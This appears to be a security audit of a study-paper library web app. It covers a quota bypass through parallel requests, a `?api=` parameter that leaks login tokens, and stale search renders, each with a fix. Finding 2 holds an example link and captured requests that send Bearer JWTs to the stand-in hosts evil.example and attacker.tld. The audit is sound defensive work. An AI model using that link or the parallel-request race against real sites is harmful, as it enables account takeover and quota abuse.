## P0 — wrong now, exploitable now

### 1. The daily quota can be bypassed with parallel requests (verified)

`routers/drive.py:225-235`

```python
db.query(User).filter(User.id == current_user.id).with_for_update().first()
used = _count_today_by_category(db, current_user.id)[quota_category]
...
db.add(DownloadLog(...)); db.commit()
```

`with_for_update()` **compiles to nothing on SQLite** (checked: the compiled
statement has no `FOR UPDATE`), and the D1 driver has no transactions at all —
each statement is its own HTTPS round-trip that commits immediately. So the
COUNT and the INSERT are two independent statements with a long gap between
them.

Measured: file-backed SQLite, `DAILY_PAPER_LIMIT=3`, six simultaneous
`POST /drive/download` requests → **six 200s, six `download_logs` rows**.
With the gap widened artificially it is 6/6 every time; at natural speed the
window on D1 is two HTTP round-trips, which is ample.

The comment at `:194` ("The row lock below … makes the quota check-then-insert
safe") is therefore not true on either database the app actually uses.

**Fix:** one conditional insert, and treat `rowcount == 0` as 429:

```sql
INSERT INTO download_logs (user_id, file_id, file_name, category, downloaded_at, confirmed)
SELECT :uid, :fid, :name, :cat, :now, 0
WHERE (SELECT COUNT(*) FROM download_logs
       WHERE user_id = :uid AND category = :cat
         AND downloaded_at >= :midnight
         AND (confirmed = 1 OR downloaded_at >= :cutoff)) < :limit
```

### 2. `?api=` hands the login token to any website (verified)

`web/assets/js/config.js:48-49`, advertised in `README.md` ("Override the
backend per-session with `?api=https://…` on any page").

jsdom run against `notes.html?api=https://evil.example` produced:

```
GET https://evil.example/auth/quota      Authorization: Bearer eyJ…
GET https://evil.example/drive/papers?section=notes   Authorization: Bearer eyJ…
```

So a link such as
`https://library.zafar.dpdns.org/notes.html?api=https://attacker.tld`
silently exports the victim's JWT. Tokens last 7 days and cannot be revoked
(see P1-11), so one click is permanent account access.

**Fix:** only honour `?api=` when `location.hostname` is `localhost` / `127.0.0.1`
(this is a development aid), otherwise ignore it and log a console warning.
Drop the sentence from the README.

### 3. A slow search response overwrites a newer one (verified)

`web/assets/js/list.js` — `load()` has no request identity.

jsdom: type `a`, then `ab`, and let the `a` response land second →

```
rendered after the faster, newer answer should have won: ["ALGEBRA old"]
stale render? YES — a slow earlier response overwrote the newer one
```

The box says "ab", the list shows results for "a", and the count chip belongs to
"a" as well. On a phone this happens constantly because debounce is 250 ms and
the API is overseas.

**Fix:** a module-level `var seq = 0; var mine = ++seq;` in `load()`, and
`if (mine !== seq) return;` before every render (same guard for the quota
request). `AbortController` would be better still.

## Missing outright

37. **No tests in the frontend repo, no CI in either repo.** The 54 backend tests
    and the ~110 jsdom checks behind the last few rounds only run by hand; a
    commit can break the demo contract, the quota copy or the 422/400 shape with
    nothing to catch it. A 30-line `package.json` + jsdom suite on push would
    cover the regressions that have actually happened.
38. **No pagination** on `GET /drive/papers` — the whole section arrived as one
    JSON array, walked in Python per request. The app now asks with
    `limit`/`offset` and reads page by page (200 at a time), combining the pages
    into one cached list; it still works against a server that ignores them.
39. **No server-side search** — every debounced keystroke re-filters a cached
    tree in Python. Fine at a few hundred files, not at a few thousand.

## What is in good shape

- No XSS found: every interpolation goes through `Zafar.escapeHTML`, and the
  server's strings are rendered as text.
- No secrets in `web/`; `config.py` has no permissive defaults.
- Private routes carry `no-store`; download URLs are HMAC-signed with an expiry.
- `prefers-reduced-motion` and `:focus-visible` are handled in both stylesheets.
- Every list page has empty / error / offline states, and the quota copy names
  its section (the round-23 work holds).
- Backend tests are green (54) and include the section-mismatch case from `7e9d64d`.

## Suggested order

1. Quota bypass (1) — the only finding that lets a student or a script take more
   than the policy allows.
2. `?api=` token export (2) — one link, permanent access.
3. Stale search render (3) — visible on every phone.
4. `with_for_update` comment + rate-limit keying (1, 4), then the frontend
   request count (4).
5. Error copy (5) and timeouts (6) — the two "stuck student" cases.
6. Everything in P2/P3 as cleanup.
